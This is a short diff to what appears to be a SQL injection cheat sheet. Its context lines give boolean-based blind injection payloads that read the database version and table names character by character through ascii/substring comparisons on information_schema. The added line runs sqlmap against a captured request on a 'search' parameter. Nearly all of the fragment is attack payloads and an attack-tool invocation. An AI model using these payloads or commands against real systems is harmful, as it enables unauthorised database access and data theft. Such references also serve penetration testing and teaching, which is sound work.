@@ -86,6 +86,9 @@ and ascii(substring(version(),2,1)) = 48 -> Second Character
 
 # Table
 and ascii(substring((select concat(table_name) from information_schema.tables where table_schema=database()),1,1)) > 100
+
+sqlmap -r test.txt -p search 
+
 ```
 Time Based Blind
 ```
